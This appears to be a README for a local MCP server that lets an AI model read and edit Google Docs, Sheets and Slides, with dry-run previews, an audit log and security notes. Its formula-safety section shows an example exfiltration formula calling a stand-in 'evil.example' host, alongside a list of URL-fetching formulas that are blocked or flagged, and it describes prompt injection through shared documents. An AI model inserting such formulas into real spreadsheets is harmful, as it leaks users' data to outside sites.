# gworkspace-docs-sheets-slides-mcp

One local MCP server for Google's Workspace Editors: **Docs, Sheets, and
Slides**, across several Google accounts. It's a single process and a single
`mcpServers` entry. Internally each product has its own module
(`src/docs.js`, `src/sheets.js`, `src/slides.js`), and `src/server.js`
registers all of their tools.

Accounts come from the shared [google-mcp-accounts](../google-mcp-accounts)
login, the same one the Gmail, Calendar, and Drive servers use.

## Scopes

| Scope | Used for |
| --- | --- |
| `documents` | Docs tools: read, create, and edit any doc the account can open |
| `spreadsheets` | Sheets tools: read, create, and edit any sheet the account can open |
| `presentations` | Slides tools: read, create, and edit any deck the account can open |
| `drive.file` | `export_presentation` only. Exports go through Drive's export endpoint |

Each product checks only its own scope, so an account that granted Sheets but
not Slides can still use the Sheets tools. `list_accounts` shows which
products each account can use.

**Export caveat.** Under `drive.file`, Drive can export only decks these
servers created or opened (for example, ones made with `create_presentation`).
A deck you made in the browser can still be read and edited through the
Slides API. To *export* it, opt that account into `drive.readonly` once:
`node auth.js <alias> --with-drive-readonly` in google-mcp-accounts. The
error message points this out when it happens. `drive.readonly` is never
requested by default.

## Tools

| Product | Tool | Runs | Notes |
| --- | --- | --- | --- |
| | `list_accounts` | read | Which products each account can use |
| Docs | `read_doc` | read | Title and plain text, including tables. `max_chars` caps output |
| Docs | `create_doc` | **immediately** | New, private doc |
| Docs | `append_text` | **immediately** | Adds text at the end of the body |
| Docs | `replace_text` | **dry run** until `confirm_replace: true` | Preview shows the match count, context around each match, and a `revision_id` |
| Sheets | `get_values` | read | `render`: formatted, unformatted, or formulas |
| Sheets | `create_spreadsheet` | **immediately** | New, private spreadsheet |
| Sheets | `update_values` | **dry run** until `confirm_update: true` | Preview is a cell-by-cell before/after diff of exactly the cells that would be written |
| Sheets | `append_values` | **immediately** | Inserts rows below existing data |
| Slides | `read_presentation` | read | Each slide's shapes and tables with `object_id`, plus speaker notes |
| Slides | `create_presentation` | **immediately** | New, private deck |
| Slides | `add_slide` | **immediately** | Layouts with title/body placeholders filled in one request |
| Slides | `edit_slide_text` | **dry run** until `confirm_edit: true` | Preview shows the shape's current text next to the new text, plus a `revision_id` |
| Slides | `export_presentation` | read, writes a local file | PDF or PPTX into the files folder. Never overwrites without `overwrite: true` |

### Judgment calls: which edits get a dry run

The rule: **anything that changes or removes content someone already wrote
gets a preview first. Anything that only adds runs immediately**, but it's
audit-logged and never auto-retried.

- **`replace_text` and `edit_slide_text` get a dry run.** They overwrite
  existing words in a doc or deck that collaborators may have open, and a
  too-broad `find` can rewrite far more than intended. Both previews return
  a `revision_id`. Passing it back as `expected_revision_id` on the confirm
  makes Google **refuse the write if anyone edited the file since the
  preview**, so you never apply a reviewed change to a document that has
  since moved on.
- **`update_values` gets a dry run.** It overwrites cells. The preview reads
  exactly the block that will be written (computed from the range's
  top-left cell and the size of `values`, so the preview and the write
  can't disagree). It lists every changed cell, and counts how many
  non-empty cells get overwritten.
- **`append_text`, `append_values`, `add_slide`, `create_doc`,
  `create_spreadsheet`, and `create_presentation` run immediately.** They
  don't touch existing content, they're easy to undo (version history, or
  delete the row/slide/file), and none of them sends anyone a notification.
  A new doc, spreadsheet, or deck is private until shared. They still write
  to the audit log, and none is retried, since a retry after a timeout
  could add the text, rows, or slide twice, or create a second file.

### Formula safety in Sheets

- `update_values` and `append_values` default to **`RAW`** input, so
  `=SUM(A1:A3)` is stored as text, not run as a formula. Pass
  `value_input_option: "USER_ENTERED"` to have values parsed as if typed.
- With `USER_ENTERED`, formulas that make Google **fetch a URL**
  (`IMPORTXML`, `IMPORTHTML`, `IMPORTDATA`, `IMPORTFEED`, `IMPORTRANGE`,
  `IMAGE`, `HYPERLINK`) can leak sheet contents to an outside site, e.g.
  `=IMAGE("https://evil.example/?"&A1)`. `update_values` flags them in its
  preview. `append_values`, which has no preview, refuses them outright.

### Audit log

Every edit, append, creation, and dry run (and every failure) is appended to
`~/.google-mcp/audit.log`, tagged
`"server": "gworkspace-docs-sheets-slides-mcp"`, with ids and sizes only.
Document text and cell values are never logged.

## Setup

1. Set up [google-mcp-accounts](../google-mcp-accounts) and connect your
   accounts. Make sure the **Docs, Sheets, Slides, and Drive APIs** are
   enabled on the Cloud project.
2. Install:

   ```bash
   cd gworkspace-docs-sheets-slides-mcp
   npm install
   ```

   Requires Node.js 20+. This repo depends on google-mcp-accounts as a
   local folder, `"google-mcp-accounts": "file:../google-mcp-accounts"`.
   That works only while the two repos are **siblings in the same parent
   folder**. If you clone this somewhere they aren't, switch that line to a
   git dependency pinned to a tag, e.g.
   `"github:<you>/google-mcp-accounts#v1.0.0"`. The tradeoff: `file:` picks
   up shared changes immediately, and a git tag picks them up only when you
   bump it.

### Claude Desktop config

Add this under `mcpServers` in
`~/Library/Application Support/Claude/claude_desktop_config.json` (macOS),
then fully quit and reopen Claude Desktop:

```json
{
  "mcpServers": {
    "gworkspace-docs-sheets-slides": {
      "command": "node",
      "args": ["/absolute/path/to/gworkspace-docs-sheets-slides-mcp/src/server.js"],
      "env": { "GWORKSPACE_MCP_FILES_DIR": "/Users/you/Downloads/google-mcp-files" }
    }
  }
}
```

The `env` line is optional. Exports go to `~/Downloads/gworkspace-mcp` by
default, and `export_presentation` can't write anywhere else (paths are
checked after resolving `../` and symlinks).

To attach an exported deck to an email, set this to the same path as
multi-gmail-mcp's `MULTI_GMAIL_MCP_FILES_DIR` (and multi-gdrive-mcp's
`MULTI_GDRIVE_MCP_FILES_DIR`). Then Gmail's `attach_document` can read
what `export_presentation` writes. Only the config changes, no code. See
"One files folder for all the servers" in google-mcp-accounts' README.

## Input limits

Ids must look like Google file ids (letters, digits, `-`, `_`). Text you
insert is capped at 100,000 chars, `find` at 1,000, and slide titles at
1,000. Sheets writes are capped at 10,000 cells per call, with at most
50,000 chars per cell (Google's own per-cell limit). Reads return up to
20,000 cells, and exports up to 10MB (Drive's export limit, checked on the
actual bytes).

## Security notes

- **Untrusted content.** Anyone can share a doc, sheet, or deck with you.
  Doc text, slide text, and titles come back wrapped in
  `<untrusted_document_content>` tags, and cell values come with a notice,
  telling Claude to treat them as data. That helps against prompt injection
  but doesn't prevent it. The dry runs and Claude Desktop's approval prompts
  are the real checks.
- **Every tool call is wrapped.** API errors and validation failures become
  MCP error results and never crash the server.
- Reads are retried with backoff on 429/5xx. Writes never are.
- This server never writes to `~/.google-mcp/accounts.json`. It only reads
  tokens.

## Development

```bash
npm test      # node:test - doc text extraction, match previews, A1 ranges, cell diffs, formula checks, slide requests
npm run lint
npm run format
```
